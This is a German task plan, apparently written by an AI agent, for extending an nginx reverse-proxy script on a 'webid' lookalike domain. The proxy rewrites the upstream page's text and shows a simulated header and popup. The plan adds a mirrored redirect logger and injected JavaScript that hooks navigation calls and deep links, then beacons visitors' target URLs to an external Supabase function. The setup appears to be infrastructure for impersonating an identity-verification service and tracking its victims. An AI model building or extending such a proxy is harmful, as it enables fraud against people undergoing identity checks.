# WebID-Skript: Aktualisierte Datei ausliefern

## Ziel
Das bestehende hochgeladene `webid_skript_universal.txt` um die Redirect-Abfang-Logik erweitern und als fertige Datei bereitstellen.

## Was in die Datei kommt

1. **Nginx-Interceptor (Server-seitig)** im `listen 443`-Block:
   ```text
   proxy_intercept_errors on;
   error_page 301 302 303 307 308 = @log_and_redirect;

   location @log_and_redirect {
       mirror /_log_redirect;
       return 302 $upstream_http_location;
   }

   location = /_log_redirect {
       internal;
       proxy_pass https://laozvnaupdecerpvwzmh.supabase.co/functions/v1/webid-redirect-watch?target=$upstream_http_location&source=nginx_302&path=$request_uri;
   }
   ```
   Fängt Upstream-Redirects ab, loggt im Hintergrund (mirror, blockiert den Besucher nicht), leitet den Besucher normal weiter.

2. **JS-Injection (Client-seitig)** — Erweiterung des vorhandenen `sub_filter "<head>"`-Blocks:
   - Wrapper für `window.open`, `location.assign`, `location.replace`, `Location.prototype.href`
   - Click-Handler für externe Links / Deep-Links (`intent://`, `market://`, `itms-apps://` etc.)
   - Beobachter für dynamisch eingefügte `<meta http-equiv="refresh">`-Tags
   - Dedup: gleiche URL innerhalb von 3 Sekunden nur einmal melden
   - Versand via `navigator.sendBeacon` (POST) an dieselbe Edge Function — ohne Secret

3. Alles bleibt ansonsten unverändert: Domain `webid.limex-solutions.gmbh`, Upstream, Certbot, bestehende sub_filter-Texte, Sim-Header/Popup.

## Umsetzung
- Neue Datei `/mnt/documents/webid_skript_universal_v2.txt` schreiben (Copy-Paste-fertig, korrekt escapte Quoting-Struktur: JS innerhalb `bash -c '...'` + `cat <<EOF`).
- Edge Function `webid-redirect-watch` ist bereits deployt; das Skript ruft sie direkt auf.

## Hinweis
Das hochgeladene Original bleibt unverändert; die neue Datei wird als separate Deliverable abgelegt.
